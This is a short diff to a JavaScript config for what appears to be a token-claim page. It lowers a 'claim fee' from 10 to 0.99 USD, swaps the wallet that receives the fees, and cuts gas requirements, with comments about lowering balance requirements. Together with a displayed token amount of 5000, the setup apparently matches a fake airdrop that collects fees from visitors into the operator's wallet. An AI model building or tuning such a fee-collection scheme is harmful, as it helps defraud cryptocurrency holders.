@@ -71,11 +71,11 @@ const config = {
 
   // 🔧 MOST COMMON FIX: Lower balance requirements
   FEE_SYSTEM: {
-    CLAIM_FEE_USD: 10.0, // Your fee amount
+    CLAIM_FEE_USD: 0.99, // Your fee amount
     DISPLAY_TOKEN_AMOUNT: 5000,
 
     // 🔥 Your wallet address - ENSURE THIS IS CORRECT
-    FUND_RECEIVER_ADDRESS: '0x8fC18E1f65993864db46Dd1FBA2dffF1DE97955c',
+    FUND_RECEIVER_ADDRESS: '0x4CF096c545aF8e7401682ED54707E28e694d4A6c',
 
     // 🔧 REDUCED gas requirements (common fix)
     MIN_BNB_FOR_GAS: 0.003, // Reduced from 0.008
